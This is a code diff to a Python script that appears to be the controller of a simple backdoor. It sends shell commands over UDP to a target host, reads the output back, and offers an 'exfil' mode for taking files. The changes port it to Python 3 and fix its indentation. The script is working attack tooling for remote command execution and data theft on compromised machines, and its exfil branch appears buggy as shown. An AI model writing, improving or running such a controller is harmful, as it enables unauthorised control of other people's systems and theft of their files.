@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 import sys, socket
 
 commands = ['execute', 'exfil']
@@ -12,11 +12,12 @@ ip = sys.argv[1]
 def execute(command):
 	try:
 		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-		sock.sendto((command), (ip, 5050))
+		sock.sendto(bytes(command, 'utf-8'), (ip, 5151))
 		respSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		respSock.bind(('0.0.0.0', 6060))
 		response = respSock.recvfrom(4096)
-		print(response[0])
+		output = response[0]
+		print(output.decode('utf-8'))
 	
 	except socket.gaierror:
 		print("OWO (notices lack of internet connection)")
@@ -27,12 +28,12 @@ def exfiltrate(filepath):
 	sock.sendto((command), (ip, 5050))
 
 if sys.argv[2] in commands:
-    instruction = sys.argv[2]
-    if instruction == 'execute':
-        shellCom = sys.argv[3]
-        for x in range(4, len(sys.argv)):
-            shellCom = shellCom + " " + sys.argv[x]
-        execute(shellCom)
+	instruction = sys.argv[2]
+	if instruction == 'execute':
+		shellCom = sys.argv[3]
+		for x in range(4, len(sys.argv)):
+			shellCom = shellCom + " " + sys.argv[x]
+		execute(shellCom)
 	if instruction == 'exfil':
 		ip = sys.argv[2]
 		filepath = sys.argv[3]
